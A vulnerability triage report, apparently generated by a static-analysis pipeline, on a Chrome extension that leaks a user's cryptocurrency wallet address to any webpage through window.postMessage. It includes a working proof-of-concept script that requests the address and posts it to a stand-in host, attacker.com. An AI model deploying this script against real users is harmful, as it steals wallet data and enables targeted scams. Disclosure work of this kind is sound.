# CoCo Analysis: kiicddjcakdmobjkcpppkgcjbpakcagp

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: storage_local_get_source → window_postMessage_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/kiicddjcakdmobjkcpppkgcjbpakcagp/opgen_generated_files/bg.js
Line 965 - chrome.runtime.onMessage listener with chrome.storage.local.get that flows to sendResponse
Content script forwards response to window.postMessage
```

**Code:**

```javascript
// Content script (cs_1.js, line 467) - Entry point
window.addEventListener("message", e => {
    if (e.source !== window || e.data.type !== "CONNECT_RIMO") return;
    const t = e.data.id;
    // ← Webpage sends CONNECT_RIMO message
    chrome.runtime.sendMessage({action: "connect"}, a => {
        // ← Receives wallet address from background
        window.postMessage({
            type: "CONNECT_RIMO_RESPONSE",
            id: t,
            success: a.success,
            data: a.data,  // ← Contains wallet_address from storage
            error: a.error
        }, "*");
    });
});

// Background script (bg.js, line 965) - Message handler
chrome.runtime.onMessage.addListener((r, a, t) => {
    if (r.action === "connect")
        return chrome.storage.local.get(["walletSelected"], e => {
            chrome.runtime.lastError
                ? console.error(chrome.runtime.lastError)
                : e.walletSelected && e.walletSelected.wallet_address
                    ? t({success: true, data: {address: e.walletSelected.wallet_address, publicKey: ""}})
                    : t({success: false, error: "No address found"})
        }), true
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM event via `window.postMessage` (webpage → content script → background → storage → content script → webpage)

**Attack:**

```javascript
// Malicious webpage code
// Step 1: Send CONNECT_RIMO message from any webpage
window.postMessage({
    type: "CONNECT_RIMO",
    id: "attack_123"
}, "*");

// Step 2: Listen for the response containing wallet address
window.addEventListener("message", (event) => {
    if (event.data.type === "CONNECT_RIMO_RESPONSE" && event.data.id === "attack_123") {
        console.log("Stolen wallet address:", event.data.data.address);

        // Exfiltrate to attacker server
        fetch("https://attacker.com/steal", {
            method: "POST",
            body: JSON.stringify({
                wallet_address: event.data.data.address,
                victim_url: location.href
            })
        });
    }
});
```

**Impact:** COMPLETE STORAGE EXPLOITATION CHAIN - Any webpage can retrieve the user's selected wallet address from the extension's storage. The attack flow is:
1. Malicious webpage posts `CONNECT_RIMO` message via `window.postMessage`
2. Content script receives it and sends `{action: "connect"}` to background
3. Background script reads `walletSelected.wallet_address` from `chrome.storage.local`
4. Background sends the wallet address back via `sendResponse`
5. Content script posts the wallet address back to the webpage via `window.postMessage("*")`
6. Attacker receives sensitive wallet address data

This is a TRUE POSITIVE with exploitable impact: sensitive data exfiltration. The extension exposes cryptocurrency wallet addresses to any webpage, which violates user privacy and could enable targeted phishing attacks or other cryptocurrency-related scams.

**Note:** The manifest has `"externally_connectable": {"matches": ["<all_urls>"]}` but per methodology we ignore manifest restrictions. The actual vulnerability is in the window.postMessage flow which is accessible from any webpage since the content script matches `<all_urls>`.
